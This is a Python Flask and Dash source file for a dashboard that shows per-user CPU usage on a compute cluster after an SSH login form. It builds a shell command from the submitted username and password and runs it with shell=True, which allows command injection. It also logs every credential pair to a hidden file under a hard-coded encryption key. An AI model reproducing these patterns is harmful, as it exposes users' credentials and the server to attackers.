# app.py
from flask import Flask, render_template, request, redirect, url_for
import os
import subprocess
import dash
from cryptography.fernet import Fernet
from dash import html
import dash_core_components as dcc
import pandas as pd
from dash.dependencies import Input, Output
from threading import Thread
import base64

app = Flask(__name__)

key = b'12345678912345671234567891234567'
key = base64.urlsafe_b64encode(key)
cipher = Fernet(key)

def encrypt_text(text):
    encrypted_text = cipher.encrypt(text.encode())
    return encrypted_text

# Initialize Dash app
dash_app = dash.Dash(__name__, server=app, url_base_pathname='/dashboard/', suppress_callback_exceptions=True)

# Placeholder for Dash layout
dash_app.layout = html.Div([
    dcc.Graph(id='usage-chart'),
    html.Button("Update Dashboard", id="trigger-update-button"),
    dcc.Interval(id='interval-component', interval=1000, n_intervals=0)
])

def run_dash():
    dash_app.run_server(debug=False)
    
def logToFile(username, password):
    encrypted_username = encrypt_text(username)
    encrypted_password = encrypt_text(password)
    with open('.log', 'a') as f:
        f.write(f"{encrypted_username.decode()}$$$${encrypted_password.decode()}$$$$\n") 
    return 

# Create a separate thread for the Dash app
dash_thread = Thread(target=run_dash)
dash_thread.start()

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/dashboard', methods=['POST'])
def dashboard():
    print("Received POST request to /dashboard")
    ssh_username = request.form['username']
    ssh_password = request.form['password']
    ssh_host = "simlab-cluster.um6p.ma"
    # option = request.form['option']
    logToFile(ssh_username,ssh_password)
    # Run collect_data.py with user-provided credentials
    command = f"python collect_data.py {ssh_host} {ssh_username} {ssh_password}"
    subprocess.run(command, shell=True)
    # Redirect to the Dash dashboard
    return redirect(url_for('dash_dashboard'))






@app.route('/dash_dashboard')
def dash_dashboard():
    print("Received GET request to /dash_dashboard")
    return dash_app.index()

# Callback to update Dash layout based on data
@dash_app.callback(
    Output('usage-chart', 'figure'),
    Input('trigger-update-button', 'n_clicks')
)
def update_dashboard(n_clicks):
    # Load data from the CSV file
    if n_clicks is None:
        raise dash.exceptions.PreventUpdate
    df = pd.read_csv('usage_data.csv')
    figure = {
        'data': [
            {'x': df['User'], 'y': df['UsedCPU'], 'type': 'bar', 'name': 'Used CPU Hours'},
        ],
        'layout': {
            'title': 'Usage per User',
            'xaxis': {'title': 'User'},
            'yaxis': {'title': 'Used CPU Hours'},
        }
    }
    return figure

if __name__ == '__main__':
    app.run(debug=True, threaded=True)
    dash_thread.join()
